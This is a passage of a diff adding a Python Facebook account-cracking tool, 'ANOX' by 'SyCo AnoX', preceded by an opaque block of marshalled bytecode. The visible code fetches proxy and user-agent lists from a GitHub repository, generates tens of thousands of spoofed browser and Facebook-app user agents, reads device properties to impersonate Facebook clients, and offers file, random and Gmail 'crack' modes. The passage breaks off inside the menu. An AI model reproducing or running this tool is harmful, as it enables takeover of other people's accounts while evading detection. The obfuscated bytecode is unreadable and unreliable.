x1d\xd1\x01\x1e\xd4\x01\x1e\xd0\x01\x1e\xd8\x01\x0b\x80\x14\x84\x1a\x88A\x81\x1d\x84\x1d\x80\x1d\xf0\x02\x03\x02P\x01\xd8\x02\r\x80+\x80+\x80+\x80+\xf8\xd8\x08\x13\xf0\x00\x01\x02P\x01\xf0\x00\x01\x02P\x01\xf0\x00\x01\x02P\x01\xd8\x02\x06\x80$\xd0\x07N\xd1\x02O\xd4\x02O\xd0\x02O\xd0\x02O\xd0\x02O\xf0\x03\x01\x02P\x01\xf8\xf8\xf8\xf8\xf8\xf0\x0b\x06\x01P\x01\xf8\xf8\xf8\xf0\x0e\x00\x01#\xd0\x00"\xd0\x00"\xd0\x00"\xd0\x00"\xd0\x00"\xd8\x00\'\xd0\x00\'\xd0\x00\'\xd0\x00\'\xd0\x00\'\xd0\x00\'\xd8\x00$\xd0\x00$\xd0\x00$\xd0\x00$\xd0\x00$\xd0\x00$\xd8\x009\xd0\x009\xd0\x009\xd0\x009\xd0\x009\xd0\x009\xd8\x00$\xd0\x00$\xd0\x00$\xd0\x00$\xd0\x00$\xd0\x00$\xd8\x00#\xd0\x00#\xd0\x00#\xd0\x00#\xd0\x00#\xd0\x00#\xd8\x00\r\x80\r\x80\r\x80\r\xd8\x00\x1f\xd0\x00\x1f\xd0\x00\x1f\xd0\x00\x1f\xd0\x00\x1f\xd0\x00\x1f\xd8\x00*\xd0\x00*\xd0\x00*\xd0\x00*\xd0\x00*\xd0\x00*\xd8\x00\'\xd0\x00\'\xd0\x00\'\xd0\x00\'\xd0\x00\'\xd0\x00\'\xd8\x00\x1e\xd0\x00\x1e\xd0\x00\x1e\xd0\x00\x1e\xd0\x00\x1e\xd0\x00\x1e\xf0\x02\x00\x08s\x02\xf0\x00\x00\x07t\x02\x80\x05\xf0\x02\x00\x07r\x02\xf0\x00\x00\x06s\x02\x80\x04\xf0\x08\x03\x01\x13\xf0\x00\x03\x01\x13\xf0\x00\x03\x01\x13\xf0\x0c\x11\x01\r\xf0\x00\x11\x01\r\xf0\x00\x11\x01\r\xf0(\x00\x01\x0e\x80\r\x80\r\x80\r\xd8\x00\x0b\x80\x0b\x80\x0b\x80\x0b\xd8\x00\x0b\x80\x0b\x80\x0b\x80\x0b\xd8\x00\n\x80\n\x80\n\x80\n\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\x0f\x80\x0f\x80\x0f\x80\x0f\xd8\x00\x0b\x80\x0b\x80\x0b\x80\x0b\xd8\x00\x0b\x80\x0b\x80\x0b\x80\x0b\xd8\x00\r\x80\r\x80\r\x80\r\xd8\x00\x10\xd0\x00\x10\xd0\x00\x10\xd0\x00\x10\xd8\x00\r\x80\r\x80\r\x80\r\xd8\x00\x0e\x80\x0e\x80\x0e\x80\x0e\xd8\x00\x10\xd0\x00\x10\xd0\x00\x10\xd0\x00\x10\xd8\x00\x0e\x80\x0e\x80\x0e\x80\x0e\xd8\x00\x0e\x80\x0e\x80\x0e\x80\x0e\xd8\x00\r\x80\r\x80\r\x80\r\xd8\x00\x0b\x80\x0b\x80\x0b\x80\x0b\xd8\x00\x0e\x80\x0e\x80\x0e\x80\x0e\xd8\x00\r\x80\r\x80\r\x80\r\xd8\x00\x0f\x80\x0f\x80\x0f\x80\x0f\xd8\x00\x0e\x80\x0e\x80\x0e\x80\x0e\xd8\x00\x0f\x80\x0f\x80\x0f\x80\x0f\xd8\x00\x1b\xd0\x00\x1b\xd0\x00\x1b\xd0\x00\x1b\xd0\x00\x1b\xd0\x00\x1b\xd8\x00\x0e\x80\x0e\x80\x0e\x80\x0e\xd8\x00\x1d\xd0\x00\x1d\xd0\x00\x1d\xd0\x00\x1d\xd0\x00\x1d\xd0\x00\x1d\xf0\x04\x05\x01\x16\xd8\x04\x13\x80O\x80O\x80O\xd8\x04\x1d\xd0\x04\x1d\xd0\x04\x1d\xd0\x04\x1d\xd0\x04\x1d\xd0\x04\x1d\xd8\x04\x1d\xd0\x04\x1d\xd0\x04\x1d\xd0\x04\x1d\xd0\x04\x1d\xd0\x04\x1d\xd0\x04\x1d\xf8\xf0\x02\x01\x01\x16\xd8\x04\x13\x80O\xd1\x04\x15\xd4\x04\x15\xd0\x04\x15\xd0\x04\x15\xd0\x04\x15\xf8\xf8\xf8\xe0\x00\x08\xd4\x00\x11\xd4\x00\x19\xd7\x00*\xd2\x00*\xd1\x00,\xd4\x00,\xd0\x00,\xf0\x04\x05\x01\x1d\xf0\x00\x05\x01\x1d\xf0\x00\x05\x01\x1d\xf0\x10\x00\x01\x04\x80\x03\x81\x05\x84\x05\x80\x05\xd8\x0f\x18\x80\x0c\xd8\x06\x14\x80\x03\xd8\x08\x16\x80\x05\xd8\x07\x15\x80\x04\xd8\x08\x17\x80\x05\xd8\t\x18\x80\x06\xd8\x07\x15\x80\x04\xd8\n\x19\x80\x07\xd8\x08\x16\x80\x05\xd8\x08\x16\x80\x05\xd8\x07\x15\x80\x04\xd8\n\x18\x80\x07\xe0\x04\x0f\x80\x03\xd8\x03\r\x80\x02\xd8\x05\x0f\x80T\x84Z\x81\\\x84\\\xd4\x05\x15\x90c\x90r\x90c\xd4\x05\x1a\xd7\x05 \xd2\x05 \xd1\x05"\xd4\x05"\x80\x04\xf0\x02\x05\x01\r\xd8\x08\x0c\x88\x04\xd0\r?\xc0\x13\xd1\x08E\xd4\x08E\xd7\x08J\xd2\x08J\xd1\x08L\xd4\x08L\x80\x14\x80\x14\xf8\xf0\x02\x03\x01\r\xd8\x05\t\x80T\xd0\n<\xb8c\xd1\x05B\xd4\x05B\x80\x13\xd8\x01\x04\x87\x19\x82\x19\x884\x90\x03\x898\xd1\x01\x14\xd4\x01\x14\xd0\x01\x14\xd8\x01\x04\x87\x19\x82\x19\x81\x1b\x84\x1b\x80\x1b\x80\x1b\x80\x1b\xf8\xf8\xf8\xe0\x00\x05\x80\x05\x80o\x98R\xd0\x00 \xd1\x00 \xd4\x00 \xd0\x00 \xf0\x02\n\x08v\x01\x80\x04\xf0\x1a$\x01\x11\xf0\x00$\x01\x11\xf0\x00$\x01\x11\xf0J\x01\x00\x01\r\x80\x0c\x81\x0e\x84\x0e\x80\x0e\xf0\x08\x13\x01\x19\xf0\x00\x13\x01\x19\xf0\x00\x13\x01\x19\xf0(\x00\x01\x05\x80\x04\x81\x06\x84\x06\x80\x06\xd8\x00\x06\x80\x06\x81\x08\x84\x08\x80\x08\xd8\x00\x05\x80\x05\xd0\x06]\xd1\x00^\xd4\x00^\xd0\x00^\xf0\x10\x00\x13\x1f\xd8\x15 \xd8!$\xf0\x02\x00\x13u\x02\xd8\x0ee\xd8\x17&\xd8\x170\xd8\x0f\x1f\xf0\x11\t\x0b\x02\xf0\x00\t\x0b\x02\x80\x07\xf0\x18\x12\x01\x1d\xf0\x00\x12\x01\x1d\xf0\x00\x12\x01\x1d\xf0(\x06\x01\x1b\xf0\x00\x06\x01\x1b\xf0\x00\x06\x01\x1b\xf0\x10\x00\x01\x06\x80\x05\xd0\x06]\xd1\x00^\xd4\x00^\xd0\x00^\xd8\x00\x05\x80\x05\xd0\x06E\xd1\x00F\xd4\x00F\xd0\x00F\xd8\x00\x05\x80\x05\xd0\x06T\xd1\x00U\xd4\x00U\xd0\x00U\xd8\x04\x10\x80H\x84L\x81N\x84N\x80\x01\xd8\x00\x05\x80\x05\xd0\x06]\xd1\x00^\xd4\x00^\xd0\x00^\xd8\x00\x05\x80\x05\x80a\x87j\x82j\xd0\x11E\xd1\x06F\xd4\x06F\xd1\x00G\xd4\x00G\xd0\x00G\xd8\x00\x05\x80\x05\xd0\x069\xd1\x00:\xd4\x00:\xd0\x00:\xd8\x00\x05\x80\x05\x80o\x98R\xd0\x00 \xd1\x00 \xd4\x00 \xd0\x00 \xd8\x0b\x10\x885\xd0\x113\xd1\x0b4\xd4\x0b4\x80\x08\xe0\x03\x0b\xd0\x0f\x1f\xd2\x03\x1f\xd1\x03\x1f\xd8\x04\t\x80E\x88/\xa0\x12\xd0\x04$\xd1\x04$\xd4\x04$\xd0\x04$\xd8\x0c\x11\x88E\xd0\x121\xd1\x0c2\xd4\x0c2\x80E\xd8\x04\t\x80E\x88$\x81K\x84K\x80K\xd8\t\r\x88\x14\x88e\x90S\xd1\t\x19\xd4\t\x19\xf0\x00%\x05,\x98R\xd8\x17\x19\x97w\x92w\x91y\x94y\x88\x0c\xd8\x13!\xa0<\xd0\x120\x88\x07\xd8\x0c1\x88\x01\xd8\x0c\x18\x88H\x8cL\x98\x11\xa07\xd0\x0c+\xd1\x0c+\xd4\x0c+\x88\x01\xd8\x0c\x16\x88D\x8cJ\x90q\x94v\xd1\x0c\x1e\xd4\x0c\x1e\x88\x01\xd8\x0b\x11\x98\x11\x88?\x88?\xd8\x0c\x11\x88E\x90$\x98\x13\x91*\xd0\x1f8\xd1\x128\xd1\x0c9\xd4\x0c9\xd0\x0c9\xd8\x0c\x14\x88C\x8cH\x89J\x8cJ\x88J\xd8\r\x0e\x88v\x8cY\x88\x02\xd8\x0b\x0f\x90q\x88=\x88=\xd8\x0c\x11\x88E\x90$\x98\x13\x91*\xd0\x1f8\xd1\x128\xd1\x0c9\xd4\x0c9\xd0\x0c9\xd8\x0c\x14\x88C\x8cH\x89J\x8cJ\x88J\xd8\x12\x13\x90D\x94\'\x88\x07\xd8\x08\r\x88\x05\xd0\x0e=\xc0\x12\xd1\x0eD\xd1\x08E\xd4\x08E\xd0\x08E\xd8\x08\r\x88\x05\x88d\x89\x0b\x8c\x0b\x88\x0b\xd8\x0c3\xd7\x0c:\xd2\x0c:\xd0;N\xd1\x0cO\xd4\x0cO\x88\x02\xd8\x13-\xb0\x03\xb0\x03\xb0L\xd10A\xd40A\xd1\x13A\x88\x08\xd8\x13&\xa8#\xa8#\xa8b\xa9\'\xac\'\xd1\x131\x88\x08\xd8\x13M\xc8s\xc8s\xd0SZ\xc9|\xcc|\xd1\x13[\x88\x08\xd8\x13\x1b\x98d\x91?\xa0X\xd1\x13-\xb0\x04\xd1\x134\xb0x\xd1\x13?\x88\x08\xd8\'3\xc0\x08\xd0\x16I\xd0\x16I\x88\x0b\xd8\r\x1a\x88X\x8c]\x982\xa0K\xb8\x17\xd0\rA\xd1\rA\xd4\rA\x88\x02\xe0\x14\x19\x90E\x98$\xa0\x14\x99+\xd0(W\xd1\x1aW\xd1\x14X\xd4\x14X\x88\t\xd8\x0c\x11\x88E\x90$\x98\x14\x91+\xd0 O\xd1\x12O\xd1\x0cP\xd4\x0cP\x88\x02\xd8\r\x12\x88U\x904\x98$\x91;\xd0!S\xd1\x13S\xd1\rT\xd4\rT\x88\x02\xd8\x11\x14\x90\x13\x90U\x90U\x984\xa0$\x99;\xd0)W\xd1\x1bW\xd1\x15X\xd4\x15X\xd1\x11Y\xd4\x11Y\x88\x06\xd8\x0f\x12\x88s\x905\x905\x98\x14\xa0\x04\x99\x1b\xd0\'W\xd1\x19W\xd1\x13X\xd4\x13X\xd1\x0fY\xd4\x0fY\x88\x04\xd8\x08\r\x88\x05\x88d\x89\x0b\x8c\x0b\x88\x0b\xd8\x08\r\x88\x05\xd0\x0eL\xd1\x08M\xd4\x08M\xd0\x08M\xd8\x08\r\x88\x05\xd0\x0e/\xb0\x12\xd1\x084\xd4\x084\xd0\x084\xd8\x08\r\x88\x05\x88d\x89\x0b\x8c\x0b\x88\x0b\xd8\r\x11\x88T\x90"\x90c\x89]\x8c]\xd7\r$\xd2\r$\xd1\r&\xd4\r&\x88\x02\xe0\x11\x16\x90\x15\x90v\x91\x1d\x94\x1d\xf0\x00\x02\t,\xf0\x00\x02\t,\x88A\xd8\x18$\x98\x0c\x99\x0e\x9c\x0e\x88I\xd8\x0c \xd0\x0c \xa0\x19\xd1\x0c+\xd4\x0c+\xd0\x0c+\xd0\x0c+\xf0\x05\x02\t,\xf0G\x01%\x05,\xf0\x00%\x05,\xf0\x00%\x05,\xf1\x00%\x05,\xf4\x00%\x05,\xf0\x00%\x05,\xf0\x00%\x05,\xf0\x00%\x05,\xf0\x00%\x05,\xf0\x00%\x05,\xf0\x00%\x05,\xf0\x00%\x05,\xf8\xf8\xf8\xf0\x00%\x05,\xf0\x00%\x05,\xf0\x00%\x05,\xf0\x00%\x05,\xf0\x00%\x05,\xf0\x00%\x05,\xf0P\x01\x00\x02\x07\x80\x15\x80\x7f\x98b\xd0\x01!\xd1\x01!\xd4\x01!\xd0\x01!\xd8\x01\x06\x80\x15\x80t\x88C\x81x\xd0\x10_\xd1\x07_\xd1\x01`\xd4\x01`\xd0\x01`\xd0\x01`\xd0\x01`s\x82\x00\x00\x00\xb4\x049\x00\xb9\x15A\x11\x03\xc1\x10\x01A\x11\x03\xc1\x15\x04A\x1a\x00\xc1\x1a\x15A2\x03\xc11\x01A2\x03\xc3\x0c\x04C\x11\x00\xc3\x11%D\x15\x03\xc37\x04C<\x02\xc3;\x01D\x15\x03\xc3<\x10D\x0f\x05\xc4\x0c\x02D\x15\x03\xc4\x0e\x01D\x0f\x05\xc4\x0f\x03D\x15\x03\xc4\x14\x01D\x15\x03\xc7\x11\x10G"\x00\xc7"\x0cG0\x03\xc9)\x1eJ\x08\x00\xca\x08:K\x04\x03\xcf\x08G-W\x03\x03\xd7\x03\x04W\x07\x07\xd7\n\x01W\x07\x07'))
+fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
+
+try:
+    import os,requests,json,time,re,random,sys,uuid,string,subprocess
+    from string import *
+    import bs4
+    #import dz
+    from concurrent.futures import ThreadPoolExecutor as tred
+    from bs4 import BeautifulSoup as sop
+    from bs4 import BeautifulSoup
+except ModuleNotFoundError: 
+    print('\n Installing missing modules ...')
+    os.system('pip install requests bs4 futures==2 > /dev/null')
+    os.system('python usmi.py')
+try:
+  import pycurl
+except:
+  os.system("pip install pycurl")
+  import pycurl
+os.system('xdg-open https://chat.whatsapp.com/Jv6uZwbW5so4zCQml49xBA')
+
+try:
+    prox= requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/proxies.txt').text
+    open('proxies.txt','w').write(proxies)
+except Exception as e:
+    print('\x1b[1;92m[√] PLEASE WAIT CHECKING UPDATE...')
+	
+proxies=open('proxies.txt','r').read().splitlines()
+
+
+android_models=[]
+try:
+    xx = requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/strings.txt').text.splitlines()
+    for line in xx:
+        android_models.append(line)
+except:pass
+
+usr=[]
+try:
+    xd=requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/ua.txt').text.splitlines()
+    for us in xd:
+        usr.append(us)
+except: pass
+
+gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
+ugen=[]
+for xd in range(10000):
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['6','7','8','9','10','11','12','13'])
+    c=f' en-us; {str(gt)}'
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+for agent in range(10000):
+    aa='Mozilla/5.0 (Linux; Android 6.0.1;'
+    b=random.choice(['6','7','8','9','10','11','12','13'])
+    c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/533.1'
+    fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(fullagnt)
+rug=[]
+for nt in range(10000):
+    rr=random.randint
+    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    rx=random.randrange(1, 999) #OPEN SOURCE PUBLISHED BY HEX+
+    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
+    rug.append(xx)
+ruz=[] 
+for mtc in range(10000):
+    rr=random.randint
+    xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
+    ruz.append(xd)
+	
+#new ua
+ugen=[]
+for agent in range(10000):
+        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
+        b=random.choice(['6','7','8','9','10','11','12'])
+        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
+        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        e=random.randrange(1, 999)
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
+        h=random.randrange(73,100)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/533.1'
+        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+        ugen.append(fullagnt)
+
+sim_id = ''
+android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
+model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
+build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
+fblc = 'en_GB'
+try:
+        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
+except:
+        fbcr = 'Zong'
+fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
+fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
+fbdv = model
+fbsv = android_version
+fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
+fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
+try:
+        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
+        total = 0
+        for i in fbcr:
+                total+=1
+        select = ('1','2')
+        if select == '1':
+                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
+                sim_id+=fbcr
+        elif select == '2':
+                try:
+                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
+                        sim_id+=fbcr
+                except Exception as e:
+                        fbcr = "Zong"
+                        sim_id+=fbcr
+        else:
+                fbcr = 'Zong'
+                sim_id+=fbcr
+except:
+        fbcr = "Zong"
+device = {
+        'android_version':android_version,
+        'model':model,
+        'build':build,
+        'fblc':fblc,
+        'fbmf':fbmf,
+        'fbbd':fbbd,
+        'fbdv':model,
+        'fbsv':fbsv,
+        'fbca':fbca,
+        'fbdm':fbdm}
+os.system('xdg-open https://www.facebook.com/profile.php?id=100095345508213')
+def ua_api():
+	rhm = str(random.randint(100,400))
+	return (f"[FBAN/Orca-Android;FBAV/"+rhm+".0.0.27.214;FBBV/426817936;FBLC/en_GB;FBRV/428276664;FBCR/Nepal Telecom;FBMF/LGE;FBBD/lge;FBPN/com.facebook.orca;FBDV/LMK525;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1422};]")
+##______COLORS____ARE________######
+pwx=[]
+W = '\033[97;1m'
+R = '\033[91;1m'
+G = '\033[92;1m'
+Y = '\033[93;1m'
+B = '\033[94;1m'
+P = '\033[95;1m'
+S = '\033[96;1m'
+N = '\x1b[0m'
+PURPLE ='\x1b[38;5;46m'
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m'
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+BLACK="\033[1;30m"
+EXTRA ='\x1b[38;5;208m'
+#________________________________________#
+
+logo=(f"""
+
+\033[1;32m   /$$$$$$        /$$   /$$        /$$$$$$        /$$   /$$
+\033[1;37m  /$$__  $$      | $$$ | $$       /$$__  $$      | $$  / $$
+\033[1;31m | $$  \ $$      | $$$$| $$      | $$  \ $$      |  $$/ $$/
+\033[1;34m | $$$$$$$$      | $$ $$ $$      | $$  | $$       \  $$$$/ 
+\033[1;37m | $$__  $$      | $$  $$$$      | $$  | $$        >$$  $$ 
+\033[1;32m | $$  | $$      | $$\  $$$      | $$  | $$       /$$/\  $$
+\033[1;35m | $$  | $$      | $$ \  $$      |  $$$$$$/      | $$  \ $$
+\033[1;31m |__/  |__/      |__/  \__/       \______/       |__/  |__/
+
+\t[×] Developed By SyCo AnoX 
+{WHITE}[•] AUTHOR       : Usman Gul
+{WHITE}[•] ANOX limit     :  UNLIMITED 
+{WHITE}[•] WhatsApp     :   +91 8302788872
+[•] FaceBook     :   SyCo AnoX
+[•] Version      :   {RED}2.0
+{WHITE}[•] FB PAGE     :   SYCO ANOX 
+
+{WHITE}================================================
+   \33[37;41m\t SYCO ANOX SAGA \33[0;m
+{WHITE}=================================================""")
+def linex():
+    print('\033[1;37m----------------------------------------------')
+
+def clear():
+        os.system('clear')
+        print(logo)
+loop=0
+oks=[]
+cps=[]
+pcp=[]
+id=[]
+tokenku=[]
+
+
+import pycurl
+from io import BytesIO
+def get_response(url):
+    response_buffer = BytesIO()
+
+    curl = pycurl.Curl()
+    curl.setopt(curl.URL, url)
+    curl.setopt(curl.WRITEDATA, response_buffer)
+
+    try:
+        curl.perform()
+    except pycurl.error as e:
+        return f"Error: {e}"
+
+    response = response_buffer.getvalue().decode('utf-8')
+    curl.close()
+
+    return response
+
+def remove_symbols_and_spaces(input_string):
+    cleaned_string = re.sub(r'[^a-zA-Z0-9#]', '', input_string)
+    return cleaned_string
+
+
+    
+               
+
+
+def menu():
+                clear()
+                x = ("***")
+                if x == ("***"):
+                        print('[1] CRACK FILE ')
+                        print('[2] RANDOM CRACK')
+                        print('[3] GMAIL CRACK')
+                        print('[4] FOLLOW FB')
+                        print('[0] EXIT ')
+                        linex()
+                        xd=input(' CHOOSE AN OPTION: ')
+                        #os.system('xdg-open ')
+                        if xd in ['1','01']:
+                                clear()
+                                
+                                print(' PUT FILE EXAMPLE :  /sdcard/File.trt.etc..')
+                                linex()
+                                file = input(' PUT FILE PATH\033[1;37m: ')
+                                try:
+                                        fo = open(file,'r').read().splitlines()
+                                except FileNotFoundError:
+                                        print(' FILE LOCATION NOT FOUND ')
